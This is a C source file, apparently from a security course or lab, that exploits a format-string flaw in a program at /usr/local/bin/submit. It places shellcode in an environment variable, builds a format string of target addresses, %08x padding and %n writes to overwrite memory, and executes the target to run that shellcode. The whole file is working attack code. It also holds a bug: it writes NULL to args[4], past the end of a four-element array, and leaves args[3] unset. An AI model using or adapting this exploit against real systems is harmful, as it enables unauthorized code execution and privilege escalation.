#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"

int main(void)
{
  int eggLength = sizeof(shellcode) + 5;
  char *args[4];
  char *env[2] = { NULL, NULL };
  char eggValue[eggLength];

  char envAddress[] = "AAAA\x8c\xdd\xbf\xff" "AAAA\x8d\xdd\xbf\xff" "AAAA\x8e\xdd\xbf\xff" "AAAA\x8f\xdd\xbf\xff";
  char padding[] = "%08x ";
  int wordDistance = 16;
  char overflow[1000];
  int j;

  strcpy(overflow, envAddress);
  for (j= 0; j < wordDistance; j++)
      strcat(overflow, padding);

  strcat(overflow, "%232d%n%295d%n%224d%n%320d%n");

  args[0] = overflow;
  args[1] = "hello.txt";
  args[2] = "-v";
  args[4] = NULL;

  strcpy(eggValue, "Egg=");
  strcat(eggValue, shellcode);

  env[0] = eggValue;
   if (execve(TARGET, args, env) < 0)
     fprintf(stderr, "execve failed.\n");

  exit(0);
}
